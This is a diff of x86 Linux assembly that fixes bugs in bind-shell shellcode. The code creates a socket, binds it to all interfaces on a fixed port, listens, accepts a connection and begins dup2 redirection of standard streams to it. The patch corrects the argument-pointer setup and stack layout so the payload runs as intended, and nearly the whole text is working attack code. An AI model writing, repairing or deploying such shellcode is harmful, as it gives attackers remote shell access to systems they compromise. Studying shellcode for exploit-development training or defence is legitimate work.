@@ -11,7 +11,7 @@ main:
     push edx        ; 3rd argument 0
     push byte 0x1   ; 2nd argument SOCK_STREAM
     push byte 0x2   ; 1st argument PF_INET
-    pop ecx         ; Address of socket arguments
+    mov ecx, esp    ; Address of socket arguments
     int 0x80        ; Exec syscall
 
     ; We need the result later
@@ -24,15 +24,16 @@ main:
     mov bl, 0x2     ; SYS_BIND
     ; Setup struct addr
     push edx        ; 0.0.0.0
+    sub esp, 2      ; Move ESP so we don't overwrite ip-addr
     mov byte [esp], 0x1c    ; Push first byte for port
     mov byte [esp+1], dl    ; Push second byte for port
-    push 0x2        ; AF_INET
+    push word 0x2   ; AF_INET
     mov ecx, esp    ; Store struct in ECX
     ; Setup bind arguments
     push 0x10       ; Addr length (16)
     push ecx        ; Struct addr
     push esi        ; Ref to sockfd
-    pop ecx         ; Address of bind arguments
+    mov ecx, esp    ; Address of bind arguments
     int 0x80        ; Exec syscall
 
     ; listen(sockid, 2)
@@ -43,7 +44,7 @@ main:
     ; Setup arguments
     push byte 0x2   ; 2
     push esi        ; Ref to sockid
-    pop ecx         ; Address of listen arguments
+    mov ecx, esp    ; Address of listen arguments
     int 0x80        ; Exec syscall
 
     ; socketid = accept(sockfd, null, null)
@@ -54,15 +55,13 @@ main:
     push edx        ; NULL
     push edx        ; 0
     push esi        ; Ref to sockid
+    mov ecx, esp    ; Address of arguments
     int 0x80
-
-    ; We need the socketid later
-    mov esi, eax    ; Ref to socketid
 
     ; dup2(socketid, 0)
     mov ebx, eax    ; Ref to socketid
     xor eax, eax    ; Zero-out EAX
-    mov ecx, edx    ; Zero-out ECX
+    xor ecx, ecx    ; Zero-out ECX
     mov al, 0x3f    ; SYS_DUP2
     int 0x80        ; Exec syscall
     ; dup2(socketid, 1)
